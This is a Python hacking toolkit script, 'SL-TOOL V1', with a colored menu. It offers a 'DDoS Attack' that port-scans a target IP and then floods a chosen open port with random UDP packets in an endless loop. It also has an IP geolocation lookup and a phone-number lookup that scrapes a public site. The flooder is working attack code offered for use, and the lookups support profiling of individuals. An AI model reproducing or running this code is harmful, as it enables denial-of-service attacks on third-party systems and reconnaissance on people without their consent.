import socket
import threading
import os
import sys
import random
import ctypes
import time
import requests
import fade  
import colorama
from colorama import Fore, Style
from pystyle import *
from bs4 import BeautifulSoup as htmlparser
import requests

delay = 20
psc = 5000
ux = 3
port = 1
sent = 0
id = 1
svc = []
bytes = random._urandom(1480)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if os.name == 'nt':
    os.system('color b')
    os.system('SL-TOOL') 
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def TCP_connect(ipp, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ipp, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''

def scan_ports(ipp, delay):
    threads = []
    output = {}


    for i in range(psc):
        t = threading.Thread(target=TCP_connect, args=(ipp, i, delay, output))
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    for i in range(psc):
        if output[i] == 'Listening':
            svc.append(int(i))

def main_menu():
    banner = '''
  ██████  ██▓       ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██    ▒ ▓██▒       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░ ▓██▄   ▒██░  ████ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
  ▒   ██▒▒██░       ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
▒██████▒▒░██████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░ ░▒  ░ ░░ ░ ▒  ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░  ░  ░    ░ ░        ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
      ░      ░  ░                ░ ░      ░ ░      ░  ░
                            
   ╔══════════════════════════════════════════════╗
   ║                 SL-TOOL V1                   ║
   ║              Coded By manig.as               ║
   ║              Discord: manig.as               ║
   ╚══════════════════════════════════════════════╝               
    '''

    # Banner rengini ayarla
    colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
    print(colored_banner)

    Write.Input("[+] Press Enter to continue...", Colors.red_to_black, interval=0.04) 
    print()
    Write.Input("[+] Open the Tool Menu?", Colors.red_to_black, interval=0.07)
    print()
    while True:
        cls()
        banner = """
████████▓ ▒█████   ▒█████   ██▓        ███▄ ▄███▓▓█████  ███▄    █  █    ██ 
▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒       ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░  ███  ▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░       ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒   ▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░   ░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░   ░  ░      ░ ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ 
  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░      ░      ░      ░      ░   ░ ░  ░░░ ░ ░ 
             ░ ░      ░ ░      ░  ░          ░      ░  ░         ░    ░     
                                                                            """
        colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
        print(colored_banner)   
        Write.Print("[1] Perform DDoS Attack\n", Colors.red_to_black, interval=0.07) 
        Write.Print("[2] Ip Information Lookup\n", Colors.red_to_black, interval=0.07)
        Write.Print("[3] Phone Lookup\n", Colors.red_to_black, interval=0.07)
        Write.Print("[4] Exit\n\n", Colors.red_to_black, interval=0.07)

        choice = Write.Input("[+] Enter Your Choice: ", Colors.red_to_white, interval=0.04) 
        if choice == '1':
            attack_menu()
        elif choice == '2':
            cls()
            ip_info_lookup()
        elif choice == '3':
            cls()
            phone_lookup()
        elif choice == '4':
            print("Exiting...")
            sys.exit()

        else:
            print("Invalid choice. Please try again.")
            time.sleep(1)

def ip_info_lookup():
    banner = """
 ██▓ ██▓███      ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄  ▓█████  ██▀███  
▓██▒▓██░  ██▒    ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██░ ██▓▒    ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▒███   ▓██ ░▄█ ▒
░██░▒██▄█▓▒ ▒    ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  
░██░▒██▒ ░  ░      ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░██▓ ▒██▒
░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒    ░ ░  ░  ░▒ ░ ▒░
░░            ░        ░░   ░   ░   ▒   ░           ░     ░░   ░ 
 ░                          ░           ░  ░░ ░         ░  ░   ░     
                                            ░                     
                                                                            """
    colored_banner = Colorate.Horizontal(Colors.green_to_black, Center.XCenter(banner))
    print(colored_banner)
    Write.Print("[+] Ip Information Lookup\n", Colors.green_to_black, interval=0.07)
    Write.Print("[1] Locate IP Address\n", Colors.green_to_black, interval=0.07)
    Write.Print("[2] Locate Your Own IP Address\n", Colors.green_to_black, interval=0.07)
    Write.Print("[3] Back to Main Menu\n", Colors.green_to_black, interval=0.07)

    choice = Write.Input("[+] Enter your choice: \n", Colors.green_to_black, interval=0.07)

    if choice == '1':
        cls()
        locate_ip()
    elif choice == '2':
        cls()
        locate_own_ip()
    elif choice == '3':
        cls()
        main_menu()
    else:
        print("Invalid choice. Please try again.")
        time.sleep(1)


def locate_ip():
    cls()
    Write.Print("Locate IP Address\n", Colors.green_to_black, interval=0.07)
    ipin = Write.Input("Enter Ip Adress: \n", Colors.green_to_black, interval=0.07)
    Write.Print(f"Searching data for {ipin} IP address...\n\n", Colors.green_to_black, interval=0.07)
    api = f"http://ip-api.com/json/{ipin}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"

    data = requests.get(api).json()
    for key, value in data.items():
        print(Fore.GREEN + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
    cls()
    ip_info_lookup()

def locate_own_ip():
    cls()
    api_own_ip = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
    data = requests.get(api_own_ip).json()
    for key, value in data.items():
        print(Fore.GREEN + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
    ip_info_lookup()

import socket
import sys

import socket
import sys

def attack_menu():
    global delay, psc, ux, port, sent, id, svc, bytes
    cls()
    banner = """
  ██████  ██▓       ▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██    ▒ ▓██▒       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░ ▓██▄   ▒██░  ███  ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
  ▒   ██▒▒██░       ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
▒██████▒▒░██████▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░░ ░ ▒  ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░  ░  ░    ░ ░       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
      ░      ░  ░      ░       ░        ░ ░        ░  
                     ░       ░                                  """
    colored_banner = Colorate.Horizontal(Colors.green_to_black, Center.XCenter(banner))
    print(colored_banner)

    print("Enter target IP:")
    ip = input(":")
    ipp = ip
    target = ip

    if len(sys.argv) == 2:
        target = socket.gethostbyname(sys.argv[1])

    print("Enter timeout seconds (recommended: 20):")
    delay = int(input(":"))
    print("Enter port scanning sensitivity (recommended: 3):")
    ux = int(input(":"))
    print("Enter port scanning range (recommended: 5000, maximum: 65535):")
    psc = int(input(":"))

    print("Estimated scanning time:", delay * ux + (psc * 0.002), "seconds\n")

    for kk in range(ux):
        scan_ports(ipp, delay)
        print("Phase", kk + 1, "completed\n")

    res = [*set(svc)]
    print("Open ports:", res)

    print("Choose port:")
    open_port = int(input(":"))

    print("Package size (minimum 5000):")
    threads = int(input(":"))
    if threads < 5000:
        sys.exit("Thread size smaller than 5000")

    c = (sent + int(threads / 100) * 100.44) / 500
    sentstring = round(sent, 1)

    if os.name == 'nt':
        Write.Print("Check task manager", Colors.green_to_black, interval=0.07)
    else:
        Write.Print("Check the traffic", Colors.green_to_black, interval=0.07)

    nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
    print("-" * nx)

    while True:
        for i in range(int(threads / 1000)):
            for j in range(16):
                sock.sendto(bytes, (ipp, open_port))

        print(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
        id += 1
        if id % 100 == 0 or id > 100 and id % 1000 == 0:
            nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
            print("-" * nx)


def phone_lookup():
    banner = '''
 ██▓███   ██░ ██  ▒█████   ███▄    █ ▓█████     ██▓     ▒█████   ▒█████   ██ ▄█▀ █    ██  ██▓███  
▓██░  ██▒▓██░ ██▒▒██▒  ██▒ ██ ▀█   █ ▓█   ▀    ▓██▒    ▒██▒  ██▒▒██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒
▓██░ ██▓▒▒██▀▀██░▒██░  ██▒▓██  ▀█ ██▒▒███      ▒██░    ▒██░  ██▒▒██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒
▒██▄█▓▒ ▒░▓█ ░██ ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄    ▒██░    ▒██   ██░▒██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒
▒██▒ ░  ░░▓█▒░██▓░ ████▓▒░▒██░   ▓██░░▒████▒   ░██████▒░ ████▓▒░░ ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░
▒▓▒░ ░  ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
░▒ ░      ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░   ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░     
░░        ░  ░░ ░░ ░ ░ ▒     ░   ░ ░    ░        ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░       
          ░  ░  ░    ░ ░           ░    ░  ░       ░  ░    ░ ░      ░ ░  ░  ░      ░                                                                                                                    
                                                                                                          
        '''

    colored_banner = Colorate.Horizontal(Colors.green_to_white, Center.XCenter(banner))
    print(colored_banner)
    def lookup(phone_number):

        http = requests.get(f"https://free-lookup.net/{phone_number}")
        html = htmlparser(http.text, "html.parser")
        infos = html.findChild("ul", {"class": "report-summary__list"}).findAll("div")

        return {k.text.strip(): infos[i+1].text.strip() if infos[i+1].text.strip() else "No information" for i, k in enumerate(infos) if not i % 2}

    while True:
        try:
            phone_number = input("Phone number: ").strip().replace("-", "").replace(" ", "").replace("+", "")
        except KeyboardInterrupt:
            return

        try:
            infos = lookup(phone_number)
        except AttributeError:
            print("Error: Invalid phone number\n")
            continue

        [print(f"{info}: {infos[info]}") for info in infos]
        print("\n")

if __name__ == "__main__":
    main_menu()
